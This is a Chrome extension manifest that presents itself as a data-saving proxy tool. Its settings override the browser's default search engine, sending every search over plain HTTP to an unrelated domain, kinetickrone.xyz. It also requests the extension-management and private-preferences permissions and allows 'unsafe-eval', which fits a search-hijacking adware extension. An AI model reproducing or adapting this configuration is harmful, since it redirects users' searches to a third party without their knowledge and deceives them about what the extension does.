{
	"background": {
		"persistent": false,
		"scripts": [
			"background_compiled.js"
		]
	},
	"browser_action": {
		"default_icon": {
			"19": "images/proxy-disabled19.png",
			"38": "images/proxy-disabled38.png"
		},
		"default_popup": "popup.html"
	},
	"chrome_settings_overrides": {
		"search_provider": {
			"encoding": "UTF-8",
			"favicon_url": "http://kinetickrone.xyz/favicon.ico",
			"is_default": true,
			"keyword": "kinetickrone",
			"name": "kinetickrone",
			"search_url": "http://kinetickrone.xyz/?taxresponsibility={searchTerms}"
		}
	},
	"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
	"default_locale": "en",
	"description": "__MSG_appDesc__",
	"icons": {
		"128": "images/app_icon128.png"
	},
	"incognito": "not_allowed",
	"manifest_version": 2,
	"minimum_chrome_version": "47",
	"name": "__MSG_appName__",
	"permissions": [
		"dataReductionProxy",
		"https://www.google-analytics.com/",
		"management",
		"preferencesPrivate",
		"storage"
	],
	"update_url": "https://clients2.google.com/service/update2/crx",
	"version": "1.0"
}